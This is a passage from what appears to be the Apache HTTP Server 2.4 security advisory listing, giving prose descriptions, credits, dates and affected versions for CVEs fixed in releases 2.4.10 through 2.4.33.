mod\_authnz\_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.

Acknowledgements: The Apache HTTP Server security team would like to thank Alex Nichols and Jakob Hirsch for reporting this issue.

| Reported to security team | 2017-12-07 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### low: <FilesMatch> bypass with a trailing newline in the file name ([CVE-2017-15715](https://www.cve.org/CVERecord?id=CVE-2017-15715))

The expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are are externally blocked, but only by matching the trailing portion of the filename.

Acknowledgements: The issue was discovered by Elar Lang - security.elarlang.eu

| Reported to security team | 2017-11-24 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### moderate: Tampering of mod\_session data for CGI applications ([CVE-2018-1283](https://www.cve.org/CVERecord?id=CVE-2018-1283))

When mod\_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a "Session" header. This comes from the "HTTP\_SESSION" variable name used by mod\_session to forward its data to CGIs, since the prefix "HTTP\_" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications. The severity is set to Moderate because "SessionEnv on" is not a default nor common configuration, it should be considered more severe when this is the case though, because of the possible remote exploitation.

Acknowledgements: The issue was discovered internally by the Apache HTTP Server team.

| Reported to security team | 2017-11-14 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### low: Possible out of bound access after failure in reading the HTTP request ([CVE-2018-1301](https://www.cve.org/CVERecord?id=CVE-2018-1301))

A specially crafted request could have crashed the Apache HTTP Server prior to version 2.4.33, due to an out of bound access after a size limit is reached by reading the HTTP header. This vulnerability is considered very hard if not impossible to trigger in non-debug mode (both log and build level), so it is classified as low risk for common server usage.

Acknowledgements: The issue was discovered by Robert Swiecki, bug found by honggfuzz.

| Reported to security team | 2018-01-23 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### low: Possible write of after free on HTTP/2 stream shutdown ([CVE-2018-1302](https://www.cve.org/CVERecord?id=CVE-2018-1302))

When an HTTP/2 stream was destroyed after being handled, the Apache HTTP Server prior to version 2.4.33 could have written a NULL pointer potentially to an already freed memory. The memory pools maintained by the server make this vulnerabilty hard to trigger in usual configurations, the reporter and the team could not reproduce it outside debug builds, so it is classified as low risk.

Acknowledgements: The issue was discovered by Robert Swiecki, bug found by honggfuzz.

| Reported to security team | 2018-01-23 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17 |

### low: Possible out of bound read in mod\_cache\_socache ([CVE-2018-1303](https://www.cve.org/CVERecord?id=CVE-2018-1303))

A specially crafted HTTP request header could have crashed the Apache HTTP Server prior to version 2.4.33 due to an out of bound read while preparing data to be cached in shared memory. It could be used as a Denial of Service attack against users of mod\_cache\_socache.

Acknowledgements: The issue was discovered by Robert Swiecki, bug found by honggfuzz.

| Reported to security team | 2018-01-23 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6 |

### low: Weak Digest auth nonce generation in mod\_auth\_digest ([CVE-2018-1312](https://www.cve.org/CVERecord?id=CVE-2018-1312))

When generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.

Acknowledgements: The issue was discovered by Nicolas Daniels.

| Reported to security team | 2013-03-05 |
| --- | --- |
| Issue public | 2018-03-21 |
| Update 2.4.33 released | 2018-03-21 |
| Affects | 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.28

### low: Use-after-free when using <Limit > with an unrecognized method in .htaccess ("OptionsBleed") ([CVE-2017-9798](https://www.cve.org/CVERecord?id=CVE-2017-9798))

When an unrecognized HTTP Method is given in an <Limit {method}> directive in an .htaccess file, and that .htaccess file is processed by the corresponding request, the global methods table is corrupted in the current worker process, resulting in erratic behaviour. This behavior may be avoided by listing all unusual HTTP Methods in a global httpd.conf RegisterHttpMethod directive in httpd release 2.4.25 and later. To permit other .htaccess directives while denying the <Limit > directive, see the AllowOverrideList directive. Source code patch (2.4) is at; CVE-2017-9798-patch-2.4.patch Source code patch (2.2) is at; CVE-2017-9798-patch-2.2.patch Note 2.2 is end-of-life, no further release with this fix is planned. Users are encouraged to migrate to 2.4.28 or later for this and other fixes.

Acknowledgements: We would like to thank Hanno Böck for reporting this issue.

| Reported to security team | 2017-07-12 |
| --- | --- |
| Issue public | 2017-09-18 |
| Update 2.4.28 released | 2017-10-05 |
| Update 2.2.35-never released | -- |
| Affects | 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.34, 2.2.32, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

# Fixed in Apache HTTP Server 2.4.27

### important: Uninitialized memory reflection in mod\_auth\_digest ([CVE-2017-9788](https://www.cve.org/CVERecord?id=CVE-2017-9788))

The value placeholder in [Proxy-]Authorization headers of type 'Digest' was not initialized or reset before or between successive key=value assignments. by mod\_auth\_digest. Providing an initial key with no '=' assignment could reflect the stale value of uninitialized pool memory used by the prior request, leading to leakage of potentially confidential information, and a segfault.

Acknowledgements: We would like to thank Robert ÅwiÄcki for reporting this issue.

| Reported to security team | 2017-06-28 |
| --- | --- |
| Issue public | 2017-07-11 |
| Update 2.4.27 released | 2017-07-11 |
| Update 2.2.34 released | 2017-07-11 |
| Affects | 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.32, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: Read after free in mod\_http2 ([CVE-2017-9789](https://www.cve.org/CVERecord?id=CVE-2017-9789))

When under stress, closing many connections, the HTTP/2 handling code would sometimes access memory after it has been freed, resulting in potentially erratic behaviour.

Acknowledgements: We would like to thank Robert ÅwiÄcki for reporting this issue.

| Reported to security team | 2017-06-30 |
| --- | --- |
| Issue public | 2017-07-11 |
| Update 2.4.27 released | 2017-07-11 |
| Affects | 2.4.26 |

# Fixed in Apache HTTP Server 2.4.26

### important: ap\_get\_basic\_auth\_pw() Authentication Bypass ([CVE-2017-3167](https://www.cve.org/CVERecord?id=CVE-2017-3167))

Use of the ap\_get\_basic\_auth\_pw() by third-party modules outside of the authentication phase may lead to authentication requirements being bypassed. Third-party module writers SHOULD use ap\_get\_basic\_auth\_components(), available in 2.2.34 and 2.4.26, instead of ap\_get\_basic\_auth\_pw(). Modules which call the legacy ap\_get\_basic\_auth\_pw() during the authentication phase MUST either immediately authenticate the user after the call, or else stop the request immediately with an error response, to avoid incorrectly authenticating the current request.

Acknowledgements: We would like to thank Emmanuel Dreyfus for reporting this issue.

| Reported to security team | 2017-02-06 |
| --- | --- |
| Issue public | 2017-06-19 |
| Update 2.4.26 released | 2017-06-19 |
| Update 2.2.34 released | 2017-07-11 |
| Affects | 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.32, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: mod\_ssl Null Pointer Dereference ([CVE-2017-3169](https://www.cve.org/CVERecord?id=CVE-2017-3169))

mod\_ssl may dereference a NULL pointer when third-party modules call ap\_hook\_process\_connection() during an HTTP request to an HTTPS port.

Acknowledgements: We would like to thank Vasileios Panopoulos and AdNovum Informatik AG for reporting this issue.

| Reported to security team | 2016-12-05 |
| --- | --- |
| Issue public | 2017-06-19 |
| Update 2.4.26 released | 2017-06-19 |
| Update 2.2.34 released | 2017-07-11 |
| Affects | 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.32, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: mod\_http2 Null Pointer Dereference ([CVE-2017-7659](https://www.cve.org/CVERecord?id=CVE-2017-7659))

A maliciously constructed HTTP/2 request could cause mod\_http2 to dereference a NULL pointer and crash the server process.

Acknowledgements: We would like to thank Robert ÅwiÄcki for reporting this issue.

| Reported to security team | 2016-11-18 |
| --- | --- |
| Issue public | 2017-06-19 |
| Update 2.4.26 released | 2017-06-19 |
| Affects | 2.4.25 |

### important: ap\_find\_token() Buffer Overread ([CVE-2017-7668](https://www.cve.org/CVERecord?id=CVE-2017-7668))

The HTTP strict parsing changes added in 2.2.32 and 2.4.24 introduced a bug in token list parsing, which allows ap\_find\_token() to search past the end of its input string. By maliciously crafting a sequence of request headers, an attacker may be able to cause a segmentation fault, or to force ap\_find\_token() to return an incorrect value.

Acknowledgements: We would like to thank Javier Jiménez (javijmor@gmail.com) for reporting this issue.

| Reported to security team | 2017-05-06 |
| --- | --- |
| Issue public | 2017-06-19 |
| Update 2.4.26 released | 2017-06-19 |
| Update 2.2.34 released | 2017-07-11 |
| Affects | 2.4.25, 2.2.32 |

### important: mod\_mime Buffer Overread ([CVE-2017-7679](https://www.cve.org/CVERecord?id=CVE-2017-7679))

mod\_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.

Acknowledgements: We would like to thank ChenQin and Hanno Böck for reporting this issue.

| Reported to security team | 2015-11-15 |
| --- | --- |
| Issue public | 2017-06-19 |
| Update 2.4.26 released | 2017-06-19 |
| Update 2.2.34 released | 2017-07-11 |
| Affects | 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.32, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

# Fixed in Apache HTTP Server 2.4.25

### low: Padding Oracle in Apache mod\_session\_crypto ([CVE-2016-0736](https://www.cve.org/CVERecord?id=CVE-2016-0736))

Prior to Apache HTTP release 2.4.25, mod\_sessioncrypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC. An authentication tag (SipHash MAC) is now added to prevent such attacks.

Acknowledgements: We would like to thank individuals at the RedTeam Pentesting GmbH for reporting this issue.

| Reported to security team | 2016-01-20 |
| --- | --- |
| Issue public | 2016-12-20 |
| Update 2.4.25 released | 2016-12-20 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### low: DoS vulnerability in mod\_auth\_digest ([CVE-2016-2161](https://www.cve.org/CVERecord?id=CVE-2016-2161))

Malicious input to mod\_auth\_digest will cause the server to crash, and each instance continues to crash even for subsequently valid requests.

Acknowledgements: We would like to thank Maksim Malyutin for reporting this issue.

| Reported to security team | 2016-07-11 |
| --- | --- |
| Issue public | 2016-12-20 |
| Update 2.4.25 released | 2016-12-20 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### moderate: mod\_userdir CRLF injection ([CVE-2016-4975](https://www.cve.org/CVERecord?id=CVE-2016-4975))

Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod\_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the "Location" or other outbound header key or value.

Acknowledgements: The issue was discovered by Sergey Bobrov

| Reported to security team | 2016-07-24 |
| --- | --- |
| Issue public | 2018-08-14 |
| Update 2.4.25 released | 2016-12-20 |
| Update 2.2.32 released | 2017-01-13 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### n/a: HTTP\_PROXY environment variable "httpoxy" mitigation ([CVE-2016-5387](https://www.cve.org/CVERecord?id=CVE-2016-5387))

HTTP\_PROXY is a well-defined environment variable in a CGI process, which collided with a number of libraries which failed to avoid colliding with this CGI namespace. A mitigation is provided for the httpd CGI environment to avoid populating the "HTTP\_PROXY" variable from a "Proxy:" header, which has never been registered by IANA. This workaround and patch are documented in the ASF Advisory at asf-httpoxy-response.txt and incorporated in the 2.4.25 and 2.2.32 releases. Note: This is not assigned an httpd severity, as it is a defect in other software which overloaded well-established CGI environment variables, and does not reflect an error in HTTP server software.

Acknowledgements: We would like to thank Dominic Scheirlinck and Scott Geary of Vend for reporting and proposing a fix for this issue.

| Reported to security team | 2016-07-02 |
| --- | --- |
| Issue public | 2016-07-18 |
| Update 2.4.25 released | 2016-12-20 |
| Update 2.2.32 released | 2016-07-18 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### low: HTTP/2 CONTINUATION denial of service ([CVE-2016-8740](https://www.cve.org/CVERecord?id=CVE-2016-8740))

The HTTP/2 protocol implementation (mod\_http2) had an incomplete handling of the LimitRequestFields directive. This allowed an attacker to inject unlimited request headers into the server, leading to eventual memory exhaustion.

Acknowledgements: We would like to thank Naveen Tiwari and CDF/SEFCOM at Arizona State University to reporting this issue.

| Reported to security team | 2016-11-22 |
| --- | --- |
| Issue public | 2016-12-04 |
| Update 2.4.25 released | 2016-12-20 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17 |

### important: Apache HTTP Request Parsing Whitespace Defects ([CVE-2016-8743](https://www.cve.org/CVERecord?id=CVE-2016-8743))

Apache HTTP Server, prior to release 2.4.25 (and 2.2.32), accepted a broad pattern of unusual whitespace patterns from the user-agent, including bare CR, FF, VTAB in parsing the request line and request header lines, as well as HTAB in parsing the request line. Any bare CR present in request lines was treated as whitespace and remained in the request field member "the\_request", while a bare CR in the request header field name would be honored as whitespace, and a bare CR in the request header field value was retained the input headers array. Implied additional whitespace was accepted in the request line and prior to the ':' delimiter of any request header lines.

RFC7230 Section 3.5 calls out some of these whitespace exceptions, and section 3.2.3 eliminated and clarified the role of implied whitespace in the grammer of this specification. Section 3.1.1 requires exactly one single SP between the method and request-target, and between the request-target and HTTP-version, followed immediately by a CRLF sequence. None of these fields permit any (unencoded) CTL character whatsoever. Section 3.2.4 explicitly disallowed any whitespace from the request header field prior to the ':' character, while Section 3.2 disallows all CTL characters in the request header line other than the HTAB character as whitespace.

These defects represent a security concern when httpd is participating in any chain of proxies or interacting with back-end application servers, either through mod\_proxy or using conventional CGI mechanisms. In each case where one agent accepts such CTL characters and does not treat them as whitespace, there is the possiblity in a proxy chain of generating two responses from a server behind the uncautious proxy agent. In a sequence of two requests, this results in request A to the first proxy being interpreted as requests A + A' by the backend server, and if requests A and B were submitted to the first proxy in a keepalive connection, the proxy may interpret response A' as the response to request B, polluting the cache or potentially serving the A' content to a different downstream user-agent.

These defects are addressed with the release of Apache HTTP Server 2.4.25 and coordinated by a new directive; HttpProtocolOptions Strict which is the default behavior of 2.4.25 and later.

By toggling from 'Strict' behavior to 'Unsafe' behavior, some of the restrictions may be relaxed to allow some invalid HTTP/1.1 clients to communicate with the server, but this will reintroduce the possibility of the problems described in this assessment. Note that relaxing the behavior to 'Unsafe' will still not permit raw CTLs other than HTAB (where permitted), but will allow other RFC requirements to not be enforced, such as exactly two SP characters in the request line.

Acknowledgements: We would like to thank David Dennerline at IBM Security's X-Force Researchers as well as Régis Leroy for each reporting this issue.

| Reported to security team | 2016-02-10 |
| --- | --- |
| Issue public | 2016-12-20 |
| Update 2.4.25 released | 2016-12-20 |
| Update 2.2.32 released | 2017-01-13 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.31, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### low: IP address spoofing when proxying using mod\_remoteip and mod\_rewrite ([CVE-2020-11985](https://www.cve.org/CVERecord?id=CVE-2020-11985))

For configurations using proxying with mod\_remoteip and certain mod\_rewrite rules, an attacker could spoof their IP address for logging and PHP scripts. Note this issue was fixed in Apache HTTP Server 2.4.24 but was retrospectively allocated a low severity CVE in 2020.

Acknowledgements:

| Reported to security team | 2016-10-13 |
| --- | --- |
| Issue public | 2020-08-07 |
| Update 2.4.25 released | 2020-08-07 |
| Affects | 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.23

### important: TLS/SSL X.509 client certificate auth bypass with HTTP/2 ([CVE-2016-4979](https://www.cve.org/CVERecord?id=CVE-2016-4979))

For configurations enabling support for HTTP/2, SSL client certificate validation was not enforced if configured, allowing clients unauthorized access to protected resources over HTTP/2. This issue affected releases 2.4.18 and 2.4.20 only.

Acknowledgements: This issue was reported by Erki Aring.

| Reported to security team | 2016-06-30 |
| --- | --- |
| Issue public | 2016-07-05 |
| Update 2.4.23 released | 2016-07-05 |
| Affects | 2.4.20, 2.4.18 |

# Fixed in Apache HTTP Server 2.4.20

### low: mod\_http2: denial of service by thread starvation ([CVE-2016-1546](https://www.cve.org/CVERecord?id=CVE-2016-1546))

By manipulating the flow control windows on streams, a client was able to block server threads for long times, causing starvation of worker threads. Connections could still be opened, but no streams where processed for these. This issue affected HTTP/2 support in 2.4.17 and 2.4.18.

Acknowledgements: This issue was reported by Noam Mazor.

| Reported to security team | 2016-02-02 |
| --- | --- |
| Issue public | 2016-04-11 |
| Update 2.4.20 released | 2016-04-11 |
| Affects | 2.4.18, 2.4.17 |

# Fixed in Apache HTTP Server 2.4.16

### low: mod\_lua: Crash in websockets PING handling ([CVE-2015-0228](https://www.cve.org/CVERecord?id=CVE-2015-0228))

A stack recursion crash in the mod\_lua module was found. A Lua script executing the r:wsupgrade() function could crash the process if a malicious client sent a carefully crafted PING request. This issue affected releases 2.4.7 through 2.4.12 inclusive.

Acknowledgements: This issue was reported by Guido Vranken.

| Reported to security team | 2015-01-28 |
| --- | --- |
| Issue public | 2015-02-04 |
| Update 2.4.16 released | 2015-07-15 |
| Affects | 2.4.12, 2.4.10, 2.4.9, 2.4.7 |

### low: Crash in ErrorDocument 400 handling ([CVE-2015-0253](https://www.cve.org/CVERecord?id=CVE-2015-0253))

A crash in ErrorDocument handling was found. If ErrorDocument 400 was configured pointing to a local URL-path with the INCLUDES filter active, a NULL dereference would occur when handling the error, causing the child process to crash. This issue affected the 2.4.12 release only.

| Reported to security team | 2015-02-03 |
| --- | --- |
| Issue public | 2015-03-05 |
| Update 2.4.16 released | 2015-07-15 |
| Affects | 2.4.12 |

### low: HTTP request smuggling attack against chunked request parser ([CVE-2015-3183](https://www.cve.org/CVERecord?id=CVE-2015-3183))

An HTTP request smuggling attack was possible due to a bug in parsing of chunked requests. A malicious client could force the server to misinterpret the request length, allowing cache poisoning or credential hijacking if an intermediary proxy is in use.

Acknowledgements: This issue was reported by Régis Leroy.

| Reported to security team | 2015-04-04 |
| --- | --- |
| Issue public | 2015-06-09 |
| Update 2.4.16 released | 2015-07-15 |
| Update 2.2.31 released | 2015-07-16 |
| Affects | 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.29, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### low: ap\_some\_auth\_required API unusable ([CVE-2015-3185](https://www.cve.org/CVERecord?id=CVE-2015-3185))

A design error in the "ap\_some\_auth\_required" function renders the API unusuable in httpd 2.4.x. In particular the API is documented to answering if the request required authentication but only answers if there are Require lines in the applicable configuration. Since 2.4.x Require lines are used for authorization as well and can appear in configurations even when no authentication is required and the request is entirely unrestricted. This could lead to modules using this API to allow access when they should otherwise not do so. API users should use the new ap\_some\_authn\_required API added in 2.4.16 instead.

Acknowledgements: This issue was reported by Ben Reser.

| Reported to security team | 2013-08-05 |
| --- | --- |
| Issue public | 2015-06-09 |
| Update 2.4.16 released | 2015-07-15 |
| Affects | 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.5, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

# Fixed in Apache HTTP Server 2.4.12

### low: HTTP Trailers processing bypass ([CVE-2013-5704](https://www.cve.org/CVERecord?id=CVE-2013-5704))

HTTP trailers could be used to replace HTTP headers late during request processing, potentially undoing or otherwise confusing modules that examined or modified request headers earlier. This fix adds the "MergeTrailers" directive to restore legacy behavior.

Acknowledgements: This issue was reported by Martin Holst Swende.

| Reported to security team | 2013-09-06 |
| --- | --- |
| Issue public | 2013-10-19 |
| Update 2.4.12 released | 2015-01-30 |
| Update 2.2.29 released | 2014-09-03 |
| Affects | 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### low: mod\_cache crash with empty Content-Type header ([CVE-2014-3581](https://www.cve.org/CVERecord?id=CVE-2014-3581))

A NULL pointer deference was found in mod\_cache. A malicious HTTP server could cause a crash in a caching forward proxy configuration. This crash would only be a denial of service if using a threaded MPM.

| Reported to security team | 2014-09-08 |
| --- | --- |
| Issue public | 2014-09-08 |
| Update 2.4.12 released | 2015-01-30 |
| Affects | 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

### low: mod\_proxy\_fcgi out-of-bounds memory read ([CVE-2014-3583](https://www.cve.org/CVERecord?id=CVE-2014-3583))

An out-of-bounds memory read was found in mod\_proxy\_fcgi. A malicious FastCGI server could send a carefully crafted response which could lead to a crash when reading past the end of a heap memory or stack buffer. This issue affects version 2.4.10 only.

Acknowledgements: This issue was reported by Teguh P. Alko.

| Reported to security team | 2014-09-17 |
| --- | --- |
| Issue public | 2014-11-12 |
| Update 2.4.12 released | 2015-01-30 |
| Affects | 2.4.10 |

### low: mod\_lua multiple "Require" directive handling is broken ([CVE-2014-8109](https://www.cve.org/CVERecord?id=CVE-2014-8109))

Fix handling of the Require line in mod\_lau when a LuaAuthzProvider is used in multiple Require directives with different arguments. This could lead to different authentication rules than expected.

| Reported to security team | 2014-11-09 |
| --- | --- |
| Issue public | 2014-11-09 |
| Update 2.4.12 released | 2015-01-30 |
| Affects | 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.10

### moderate: mod\_proxy denial of service ([CVE-2014-0117](https://www.cve.org/CVERecord?id=CVE-2014-0117))

A flaw was found in mod\_proxy in httpd versions 2.4.6 to 2.4.9. A remote attacker could send a carefully crafted request to a server configured as a reverse proxy, and cause the child process to crash. This could lead to a denial of service against a threaded MPM.

Acknowledgements: This issue was reported by Marek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466 via HP ZDI

| Reported to security team | 2014-04-07 |
| --- | --- |
| Issue public | 2014-07-15 |
| Update 2.4.10 released | 2014-07-15 |
| Affects | 2.4.9, 2.4.7, 2.4.6 |

### moderate: mod\_deflate denial of service ([CVE-2014-0118](https://www.cve.org/CVERecord?id=CVE-2014-0118))

A resource consumption flaw was found in mod\_deflate. If request body decompression was configured (using the "DEFLATE" input filter), a remote attacker could cause the server to consume significant memory and/or CPU resources. The use of request body decompression is not a common configuration.

Acknowledgements: This issue was reported by Giancarlo Pellegrino and Davide Balzarotti

| Reported to security team | 2014-02-19 |
| --- | --- |
| Issue public | 2014-07-14 |
| Update 2.4.10 released | 2014-07-15 |
